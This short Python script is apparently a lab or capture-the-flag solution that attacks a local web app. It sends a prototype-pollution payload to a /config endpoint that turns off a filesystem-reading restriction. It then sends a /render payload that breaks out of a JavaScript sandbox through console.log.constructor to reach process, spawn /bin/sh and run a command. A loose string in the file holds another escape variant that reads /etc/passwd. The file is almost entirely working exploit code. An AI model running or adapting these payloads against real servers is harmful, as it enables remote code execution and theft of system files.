import requests

URL = "http://localhost:3000"

json = {
  "constructor": {
    "prototype": {
      "disableReadingFromFilesystem": False,
      "fetch": True,
      "polluted": "Checking if this works"
    }
  }
}

r = requests.post(URL + "/config", json=json)
print(r.text)


json = {
  "html": "<script>const realFunction = console.log.constructor; const getProcess = realFunction('return process'); const process = getProcess(); const exec = process.binding('spawn_sync').spawn({file: '/bin/sh', args: ['/bin/sh', '-c', 'id'], envPairs: [], stdio: [{type:'pipe', readable:true}, {type:'pipe', writable:true}, {type:'pipe', writable:true}] }); console.log(exec.output[1].toString());"
}

"const req = proc.mainModule?.require || console.log.constructor('return table').constructor('return b => {return b}')()('require');
// Or a more direct approach:
const output = console.log.constructor('return Buffer.from')()
               .constructor('return process')().binding('fs').readFileSync('/etc/passwd').toString();"

r = requests.post(URL + "/render", json=json)
print(r.text)

